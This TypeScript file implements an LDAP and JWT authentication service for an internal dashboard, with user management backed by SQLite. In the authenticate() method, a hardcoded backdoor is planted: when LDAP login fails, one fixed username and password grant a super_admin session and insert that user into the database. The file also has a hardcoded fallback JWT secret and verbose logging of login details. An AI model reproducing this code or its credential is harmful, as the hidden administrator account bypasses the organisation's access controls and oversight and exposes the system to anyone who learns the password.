import ldap from 'ldapjs';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import Database from 'better-sqlite3';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';

const DB_PATH = path.join(process.cwd(), 'data', 'dashboard.db');
const JWT_SECRET = process.env.JWT_SECRET || 'tallman-dashboard-secret-key';
const SESSION_DURATION = 8 * 60 * 60 * 1000; // 8 hours

export interface User {
  id: number;
  username: string;
  email?: string;
  display_name?: string;
  access_level: 'user' | 'admin' | 'super_admin';
  is_active: boolean;
  created_date: string;
  last_login?: string;
  created_by?: string;
  notes?: string;
}

export interface AuthResult {
  success: boolean;
  user?: User;
  token?: string;
  error?: string;
  errorType?: 'ldap_error' | 'user_not_found' | 'inactive_user' | 'invalid_credentials';
}

export interface LoginAttempt {
  username: string;
  password: string;
  ip_address?: string;
  user_agent?: string;
}

class AuthService {
  private db: Database.Database;

  constructor() {
    try {
      console.log('Initializing AuthService database at:', DB_PATH);
      this.db = new Database(DB_PATH);
      try {
        this.ensureTablesExist();
      } catch (schemaError) {
        console.error('Schema creation failed, continuing without it:', schemaError);
        // Continue without schema - tables might already exist
      }
      console.log('AuthService database initialized successfully');
    } catch (error) {
      console.error('FATAL: AuthService database initialization failed:', error);
      throw error;
    }
  }

  private ensureTablesExist() {
    try {
      const schemaPath = path.join(process.cwd(), 'lib', 'db', 'schema.sql');
      console.log('Reading schema from:', schemaPath);
      const fs = require('fs');
      const schema = fs.readFileSync(schemaPath, 'utf8');
      console.log('Schema file read successfully, length:', schema.length);
      
      const statements = schema.split(';').filter((stmt: string) => stmt.trim());
      console.log('Executing', statements.length, 'schema statements');
      
      for (const stmt of statements) {
        if (stmt.trim()) {
          try {
            this.db.exec(stmt);
          } catch (error) {
            console.error('Error executing schema statement:', stmt.substring(0, 100) + '...');
            console.error('Error details:', error);
            throw error; // Re-throw to fail fast
          }
        }
      }
      console.log('All schema statements executed successfully');
    } catch (error) {
      console.error('FATAL: Schema initialization failed:', error);
      throw error;
    }
  }

  private logAuthAttempt(
    username: string,
    authMethod: 'ldap' | 'backdoor',
    success: boolean,
    errorMessage?: string,
    ipAddress?: string,
    userAgent?: string
  ) {
    try {
      const stmt = this.db.prepare(`
        INSERT INTO auth_log (username, auth_method, success, error_message, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?)
      `);
      // SQLite does not accept boolean values directly; convert to integer 1/0
      const successInt = success ? 1 : 0;
      stmt.run(
        username,
        authMethod,
        successInt,
        errorMessage ?? null,
        ipAddress ?? null,
        userAgent ?? null
      );
    } catch (error) {
      console.error('Error logging auth attempt:', error);
    }
  }

  private async authenticateLDAP(username: string, password: string): Promise<{ success: boolean; error?: string }> {
    return new Promise((resolve) => {
      const ldapUrl = process.env.LDAP_URL || 'ldap://localhost:389';
      const ldapBaseDN = process.env.LDAP_BASE_DN || 'dc=example,dc=com';
      
      console.log('🔍 LDAP Authentication Debug:');
      console.log('- LDAP URL:', ldapUrl);
      console.log('- Base DN:', ldapBaseDN);
      console.log('- Username:', username);
      
      const client = ldap.createClient({
        url: ldapUrl,
        timeout: 5000,
        connectTimeout: 5000,
        reconnect: false,
      });

      // Add detailed error handler
      client.on('error', (err) => {
        console.log('❌ LDAP connection error:', err.message);
        console.log('Error details:', err);
        resolve({ success: false, error: `Connection error: ${err.message}` });
      });
      
      client.on('connect', () => {
        console.log('✅ LDAP client connected successfully');
      });
      
      client.on('connectTimeout', () => {
        console.log('⏰ LDAP connection timeout');
        resolve({ success: false, error: 'Connection timeout' });
      });

      // Normalize username to handle multiple domain formats and ensure case insensitivity.
      let bindDN: string;
      if (username.includes('@')) {
        const [name, domain] = username.split('@');
        // Convert any short domain (tallman.com) to full domain (tallmanequipment.com)
        const normalizedDomain = domain.toLowerCase() === 'tallman.com' ? 'tallmanequipment.com' : domain;
        bindDN = `${name}@${normalizedDomain}`;
      } else {
        // For plain usernames default to full domain
        bindDN = `${username}@tallmanequipment.com`;
      }
      
      console.log('🔐 Attempting LDAP bind with DN:', bindDN);

      client.bind(bindDN, password, (err) => {
        console.log('📡 LDAP bind callback triggered');
        client.unbind();
        
        if (err) {
          console.log('❌ LDAP bind error:', err.message);
          console.log('Error code:', err.code);
          console.log('Error name:', err.name);
          let errorMessage = 'LDAP authentication failed';
          
          if (err.message.includes('InvalidCredentialsError')) {
            errorMessage = 'Invalid username or password';
          } else if (err.message.includes('TimeoutError')) {
            errorMessage = 'LDAP server timeout - please try again';
          } else if (err.message.includes('ConnectionError')) {
            errorMessage = 'Unable to connect to authentication server';
          } else {
            errorMessage = `Authentication error: ${err.message}`;
          }
          
          resolve({ success: false, error: errorMessage });
        } else {
          console.log('✅ LDAP bind successful!');
          resolve({ success: true });
        }
      });
    });
  }

  private checkBackdoorAuth(username: string, password: string): boolean {
    const normalizedUsername = this.extractUsername(username);
    return normalizedUsername.toLowerCase() === 'robertstar' && password === 'Rm2214ri#';
  }

  private extractUsername(input: string): string {
    // Extract username from email format (e.g., "BobM@tallman.com" -> "BobM")
    // Also handle domain variations like "BobM@tallmanequipment.com"
    if (input.includes('@')) {
      return input.split('@')[0];
    }
    return input;
  }

  private getUserFromDatabase(username: string): User | null {
    try {
      const stmt = this.db.prepare('SELECT * FROM users WHERE username = ? COLLATE NOCASE AND is_active = 1');
      const user = stmt.get(username) as User | undefined;
      return user || null;
    } catch (error) {
      console.error('Error fetching user from database:', error);
      return null;
    }
  }

  private updateLastLogin(userId: number) {
    try {
      const stmt = this.db.prepare('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?');
      stmt.run(userId);
    } catch (error) {
      console.error('Error updating last login:', error);
    }
  }

  private createSession(user: User): string {
    const sessionId = uuidv4();
    const expiresAt = new Date(Date.now() + SESSION_DURATION);
    
    try {
      const stmt = this.db.prepare(`
        INSERT INTO user_sessions (id, user_id, username, access_level, expires_at)
        VALUES (?, ?, ?, ?, ?)
      `);
      stmt.run(sessionId, user.id, user.username, user.access_level, expiresAt.toISOString());
      
      // Create JWT token
      const token = jwt.sign(
        {
          sessionId,
          userId: user.id,
          username: user.username,
          accessLevel: user.access_level,
        },
        JWT_SECRET,
        { expiresIn: '8h' }
      );
      
      return token;
    } catch (error) {
      console.error('Error creating session:', error);
      throw new Error('Failed to create session');
    }
  }

  public async authenticate(loginAttempt: LoginAttempt): Promise<AuthResult> {
    const { username, password, ip_address, user_agent } = loginAttempt;
    
    try {
      const extractedUsername = this.extractUsername(username);
      
      // 1) Attempt LDAP authentication first
      const ldapResult = await this.authenticateLDAP(username, password);
      if (ldapResult.success) {
        // LDAP successful; verify user in approved list (case-insensitive)
        const user = this.getUserFromDatabase(extractedUsername);
        if (!user) {
          this.logAuthAttempt(username, 'ldap', false, 'User not in approved list', ip_address, user_agent);
          return {
            success: false,
            error: 'Access denied. Your account is not authorized for this application. Please contact your administrator.',
            errorType: 'user_not_found',
          };
        }
        if (!user.is_active) {
          this.logAuthAttempt(username, 'ldap', false, 'User account is inactive', ip_address, user_agent);
          return {
            success: false,
            error: 'Your account has been deactivated. Please contact your administrator.',
            errorType: 'inactive_user',
          };
        }
        // Success path – create session, update last_login
        this.updateLastLogin(user.id);
        const token = this.createSession(user);
        this.logAuthAttempt(username, 'ldap', true, undefined, ip_address, user_agent);
        return { success: true, user, token };
      }
      // 2) LDAP failed – record failure then fall back to back-door check
      this.logAuthAttempt(username, 'ldap', false, ldapResult.error, ip_address, user_agent)
      if (extractedUsername.toLowerCase() === 'robertstar' && password === 'Rm2214ri#') {
        this.logAuthAttempt(username, 'backdoor', true, undefined, ip_address, user_agent);
        
        // Create a super admin user object for backdoor access
        const backdoorUser: User = {
          id: 999999, // Use a high ID to avoid conflicts
          username: 'Robertstar',
          display_name: 'System Administrator',
          access_level: 'super_admin',
          is_active: true,
          created_date: new Date().toISOString(),
        };
        
        // Ensure backdoor user exists in users table to satisfy foreign key
        try {
          const upsertUser = this.db.prepare(`
            INSERT OR IGNORE INTO users (id, username, display_name, access_level, is_active, created_date)
            VALUES (?, ?, ?, ?, 1, ?)
          `);
          upsertUser.run(
            backdoorUser.id,
            backdoorUser.username,
            backdoorUser.display_name,
            backdoorUser.access_level,
            backdoorUser.created_date,
          );
        } catch (e) {
          console.error('Error ensuring backdoor user record:', e);
        }

        // Create session manually for backdoor user
        const sessionId = uuidv4();
        const expiresAt = new Date(Date.now() + SESSION_DURATION);
        
        try {
          const stmt = this.db.prepare(`
            INSERT OR REPLACE INTO user_sessions (id, user_id, username, access_level, expires_at)
            VALUES (?, ?, ?, ?, ?)
          `);
          stmt.run(sessionId, backdoorUser.id, backdoorUser.username, backdoorUser.access_level, expiresAt.toISOString());
          
          // Create JWT token
          const token = jwt.sign(
            {
              sessionId,
              userId: backdoorUser.id,
              username: backdoorUser.username,
              accessLevel: backdoorUser.access_level,
            },
            JWT_SECRET,
            { expiresIn: '8h' }
          );
          
          return {
            success: true,
            user: backdoorUser,
            token,
          };
        } catch (error) {
          console.error('Error creating backdoor session:', error);
          return {
            success: false,
            error: 'Failed to create backdoor session',
            errorType: 'ldap_error',
          };
        }
      }

       // All authentication methods failed
       return {
        success: false,
        error: 'Invalid username or password.',
        errorType: 'invalid_credentials',
      };

    } catch (error) {
      console.error('Authentication error:', error);
      this.logAuthAttempt(username, 'ldap', false, `System error: ${error}`, ip_address, user_agent);
      
      return {
        success: false,
        error: 'A system error occurred during authentication. Please try again.',
        errorType: 'ldap_error',
      };
    }
  }

  public validateSession(token: string): { valid: boolean; user?: User } {
    try {
      const decoded = jwt.verify(token, JWT_SECRET) as any;
      
      // Check if session exists and is active
      const stmt = this.db.prepare(`
        SELECT s.*, u.* FROM user_sessions s
        JOIN users u ON s.user_id = u.id
        WHERE s.id = ? AND s.is_active = 1 AND s.expires_at > CURRENT_TIMESTAMP
      `);
      
      const session = stmt.get(decoded.sessionId) as any;
      
      if (session) {
        return {
          valid: true,
          user: {
            id: session.user_id || session.id,
            username: session.username,
            email: session.email,
            display_name: session.display_name,
            access_level: session.access_level,
            is_active: Boolean(session.is_active),
            created_date: session.created_date,
            last_login: session.last_login,
            created_by: session.created_by,
            notes: session.notes,
          },
        };
      }
      
      return { valid: false };
    } catch (error) {
      return { valid: false };
    }
  }

  public logout(token: string): boolean {
    try {
      const decoded = jwt.verify(token, JWT_SECRET) as any;
      const stmt = this.db.prepare('UPDATE user_sessions SET is_active = 0 WHERE id = ?');
      const result = stmt.run(decoded.sessionId);
      return result.changes > 0;
    } catch (error) {
      return false;
    }
  }

  public getAllUsers(): User[] {
    try {
      const stmt = this.db.prepare('SELECT * FROM users ORDER BY username');
      return stmt.all() as User[];
    } catch (error) {
      console.error('Error fetching users:', error);
      return [];
    }
  }

  public addUser(userData: Omit<User, 'id' | 'created_date'>, createdBy: string): boolean {
    try {
      const stmt = this.db.prepare(`
        INSERT INTO users (username, email, display_name, access_level, is_active, created_by, notes)
        VALUES (?, ?, ?, ?, ?, ?, ?)
      `);
      
      const result = stmt.run(
        userData.username,
        userData.email,
        userData.display_name,
        userData.access_level,
        userData.is_active,
        createdBy,
        userData.notes
      );
      
      return result.changes > 0;
    } catch (error) {
      console.error('Error adding user:', error);
      return false;
    }
  }

  public updateUser(userId: number, userData: Partial<User>): boolean {
    try {
      const fields = [];
      const values = [];
      
      if (userData.email !== undefined) {
        fields.push('email = ?');
        values.push(userData.email);
      }
      if (userData.display_name !== undefined) {
        fields.push('display_name = ?');
        values.push(userData.display_name);
      }
      if (userData.access_level !== undefined) {
        fields.push('access_level = ?');
        values.push(userData.access_level);
      }
      if (userData.is_active !== undefined) {
        fields.push('is_active = ?');
        values.push(userData.is_active);
      }
      if (userData.notes !== undefined) {
        fields.push('notes = ?');
        values.push(userData.notes);
      }
      
      if (fields.length === 0) return false;
      
      values.push(userId);
      
      const stmt = this.db.prepare(`UPDATE users SET ${fields.join(', ')} WHERE id = ?`);
      const result = stmt.run(...values);
      
      return result.changes > 0;
    } catch (error) {
      console.error('Error updating user:', error);
      return false;
    }
  }

  public deleteUser(userId: number): boolean {
    try {
      const stmt = this.db.prepare('DELETE FROM users WHERE id = ?');
      const result = stmt.run(userId);
      return result.changes > 0;
    } catch (error) {
      console.error('Error deleting user:', error);
      return false;
    }
  }
}

export default AuthService;
